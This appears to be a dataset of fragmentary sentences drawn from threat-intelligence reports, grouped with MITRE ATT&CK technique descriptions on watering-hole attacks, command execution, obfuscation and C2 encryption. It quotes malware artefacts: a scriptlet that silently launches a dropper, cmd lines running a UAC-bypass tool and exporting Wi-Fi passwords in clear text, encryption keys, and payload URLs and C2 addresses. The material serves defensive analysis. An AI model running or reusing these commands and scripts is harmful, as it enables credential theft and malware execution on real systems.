From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS
We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks
What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF
This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7
Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks
Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets
The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks
Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information
[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims
Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)
Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).

Multiple ways of delivering exploit code to a browser exist, including:

* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
* Malicious ads are paid for and served through legitimate ad providers.
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.

Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)
This is followed by a number of Linux shell command style commands related to the malware establishing persistence
The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell
This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process
Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement
The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders
Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline
After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line
The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters
These commands are also executed when the loadconfig command is issued
The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it
The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4
Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”
Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output
This script relays commands and output between the controller and the system
The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)
RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool
These are in-line with the targeting of the victims witnessed by the attackers using Conmie
Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan
Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands
Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell
Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands
Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker
!CMD  Trojan executes a command prompt command
The Trojan will save the output of the command to %TEMP%\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful
Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files
The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini
/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer
Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C
It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)
This ID is sent to the CnC with each request for commands to execute
Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“
Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30
Traps provides endpoint protection, as it can block Excel from creating a command prompt process
For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands
cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\Windows\GDI.bin
Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments
The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\tmpCa.vbs
The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests
The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests
<?XML version=”1.0″?> <scriptlet> <registration description=”fjzmpcjvqp” progid=”fjzmpcjvqp” version=”1.00″ classid=”{204774CF-D251-4F02-855B-2BE70585184B}” remotable=”true” > </registration> <script language=”JScript”> <![CDATA[ var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\qrat.exe”,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\Users\%username%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe
C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS
Access remote objects interactively from the pupy shell and get auto-completion of remote attributes
Execute noninteractive commands on multiple hosts at once
Open interactive python shells with auto-completion on the all-in-memory remote python interpreter
Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely
Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell
Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor
Figure 6: SpeakUp receives additional commands to execute, this time in plain text
Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device
BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration
MURKYTOP: a command-line reconnaissance tool
The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands
The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018
It is used to create new processes, perform as a command line shell, and several other tasks
The starred commands are undocumented commands
Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell
UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe
This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system
We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1

Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)
Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities
For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples
That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload
Messages are encrypted using AES with a static key
The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload
After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word
The code is obfuscated in order to hide any malicious activity on the remote server
Bxaki obfuscated function
This strangeness was related to values listed in newer BlackEnergy configuration files
Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)
Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found
It is prepended to the encrypted and encoded message
The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed
Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult
This build tool encrypts the binary’s strings with a fresh key for each build
Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1
The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017
Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data
Configuration Config.ini is the file where the malware stores its encrypted configuration data
These requests are encrypted using the RC4 algorithm
While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload
Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state
The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks
APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property
When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised
WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script
Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult
Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\system32), the encrypted backdoor is located in a different directory (%Program Files%\Common Files\System\ado)
All strings used by the Trojan are encrypted with the XOR algorithm
Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)
11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”
Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added
The first 11 bytes of the received buffer are encrypted with the XOR algorithm
Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64
The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers
These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer
Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES
Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related
Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2
The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE
Malicious obfuscated VBA code is executed when the macro is first enabled
The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions
After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works
The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx
In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code
Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language
There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string
All strings below are encrypted via AES256 and base64 encoding
Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation
At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character
The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run
A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation
This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses
Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell
Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex
By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog
All the strings and settings were encrypted and obfuscated
The configuration and strings are encrypted using 3DES and Base64 encoding
The C&C server then replies with the encrypted serialized configuration
The shellcode is not encrypted but is obfuscated
Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed
The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value
The configuration blob is encoded using a simple single-byte XOR scheme
KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)
The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor
Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64
Some strings are obfuscated with XOR x56
These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”
The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \x36\x11\xdd\x08\xac\x4b\x72\xf8\x51\x04\x68\x2e\x3e\x38\x64\x32
This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}
We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration
The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated
Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document
HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming
Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way
All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks
Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section
All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks
PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.
Once executed, Vcrodat loads an encrypted payload on to the victim’s computer.

Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter


The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.
The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values
This shellcode is decrypted in memory through EQENDT32.EXE
The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.
The "Blackwater.bas" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.
The actors have made some small changes, such as altering the variable names to avoid Yara detection
To operate and evade standard analysis tools, most of the functions are hashed
Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. 

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. 

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) 
Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account
The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)
Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session
A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code
After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption
The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server
Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response
The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2
The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie
<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command
Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:   <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>   To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers
The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string
Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.
Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign
Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before
Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post
In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines
APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration
In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain
Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to
By running SSH on the server in a compromised network, attackers can come back to the network whenever they want
Note that IP addresses can be reallocated
Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations
It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway
Regular Expressions   ([^r-v\\s])[r-v]([\\w\\d+\\/=]+)-\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8})   Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(\\d+.\\d+.\\d+.\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers
Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123
This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure
This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name
After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with
DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network
FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S
If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie
DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems
The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system
When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network
text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list
Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses
The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname
The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system
Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets
Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”
The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim
If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1
It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure
The email address is associated with the Lebanese domain of a major global financial institution
Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017
The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command "05 01 00 01 c0 b8 3c e5 00 51" and verifies that the first two bytes from the server are "05 00" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)
The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document
The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document
The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org
Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking
chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents
fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents
mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents
In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97
Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies
One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address
The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two
RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation
One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder="%APPDATA%" They then gather more network information with a call to ipconfig and arp -a
Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings
hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID
